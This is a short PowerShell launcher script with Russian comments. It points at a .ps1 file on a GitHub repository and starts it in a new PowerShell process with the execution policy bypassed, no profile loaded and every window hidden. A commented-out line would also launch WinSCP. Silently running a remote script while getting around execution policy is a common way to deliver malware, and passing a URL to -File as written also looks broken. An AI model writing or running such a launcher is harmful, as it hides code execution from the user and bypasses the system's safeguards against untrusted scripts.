$src = "https://github.com/AnatolikFFF/kupikupi_nonono/blob/main/test3.ps1"
# $winScp = "C:\Program Files (x86)\WinSCP\WinSCP.exe"

# Запуск скрипта (в отдельном PowerShell)
Start-Process -FilePath "powershell.exe" `
  -ArgumentList @("-NoProfile","-ExecutionPolicy","Bypass","-WindowStyle","Hidden","-File",$src) `
  -WindowStyle Hidden

# Параллельно запуск WinSCP
# Start-Process -FilePath $winScp
